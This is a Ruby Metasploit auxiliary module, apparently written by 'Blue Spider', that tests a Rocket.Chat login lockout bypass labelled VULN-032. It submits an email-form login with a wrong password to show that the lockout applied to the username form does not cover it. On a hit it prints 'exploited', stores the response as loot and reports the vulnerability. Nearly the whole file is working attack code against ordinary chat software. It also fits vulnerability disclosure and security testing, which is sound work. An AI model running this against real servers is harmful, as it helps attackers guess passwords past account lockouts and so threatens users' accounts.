class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat account-lockout email-form bypass probe (VULN-032)',
        'Description' => %q{
          Rocket.Chat's lockout counts the username as typed, so the email form
          bypasses it. This module attempts the email-form login while the username
          form is blocked, showing it is not rate-limited. The operator triggers the
          block first; the module creates nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/login']),
      OptString.new('EMAIL', [true, 'The victim\'s email address', 'alice@lab.invalid']),
      OptString.new('WRONGPASS', [true, 'Any wrong password', 'wrong-password'])
    ])
  end

  def run
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'vars_post' => {
        'user' => "#{datastore['EMAIL']}",
        'password' => "#{datastore['WRONGPASS']}"
      }
    })
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = api_error(res).to_s.include?('Unauthorized') && !api_error(res).to_s.include?('login-blocked')
    fail_with(Failure::NotVulnerable, 'VULN-032: the attack did not land') unless hit

    print_good("#{peer} - VULN-032: exploited")
    print_status("#{peer} - email-form login is not blocked; trigger the username-form lockout first to confirm")
    path = store_loot('blue_spider.vuln_032', 'text/plain', rhost, res.body.to_s, 'vuln_032.txt', 'VULN-032 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-032 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end
end
